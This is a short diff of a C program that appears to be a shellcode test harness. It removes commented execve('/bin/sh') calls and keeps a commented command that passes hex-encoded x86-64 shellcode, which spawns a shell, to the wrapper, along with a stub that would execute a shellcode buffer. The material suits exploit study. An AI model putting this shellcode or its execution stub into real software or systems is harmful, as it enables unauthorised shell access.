@@ -32,11 +32,6 @@ int main(int argc,  char *argv[]){
 
 //    (*(void (*)())shellcode)();
 
-//
-//    const char *argvx = ["/bin/sh", "lol"];
-//
-//    execve("/bin/sh", NULL, NULL);
-
 //  cmake-build-debug/wrapper $(python3 -c 'print("\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05")')
 
 
